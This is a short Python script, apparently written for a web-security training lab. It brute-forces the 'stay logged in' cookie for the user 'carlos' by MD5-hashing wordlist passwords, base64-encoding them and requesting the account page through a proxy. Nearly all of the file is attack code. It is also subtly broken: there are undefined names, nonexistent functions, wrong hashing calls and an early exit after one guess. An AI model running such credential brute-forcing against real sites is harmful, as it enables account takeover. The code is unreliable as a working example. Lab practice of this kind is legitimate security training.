import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestwarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def access_carlos_account(url):
    print("(+) Bruteforcing the carlos's account...")
    with open('C:\Users\Hp\OneDrive\Documents\codes\Python codes\Authentication_Vulnerabilities\password.txt', 'r') as f:
        for pwd in file:
            hashed_pwd = 'carlos' + hashlib.md5(pwd.rstrip('\r\n')).encode('utf-8').hexdigest()
            encoded_strings = base64.base64encode(bytes(hashed_pwd, 'utf-8'))
            str_pwd = encoded_strings.decode('utf-8')
            # Perform the Request 
            r = requests.Session()
            my_account_url = url + "/my-account"
            cookies = {'stay logged in cookie': str_pwd}
            req = r.get(my_account_url, cookies=cookies, proxies=proxies, verify=False)
            if 'log out' in req: 
                print("(+) Carlos's password is: " + pwd)
                print("(+) We successfully solved the lab ")
                sys.exit(-1)
            else:
                print("(+) Check for the error inside the code and try again")
                sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage: %s' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    url = sys.arg[1]
    access_carlos_account(url)

if __name__ == '__main__':
    main()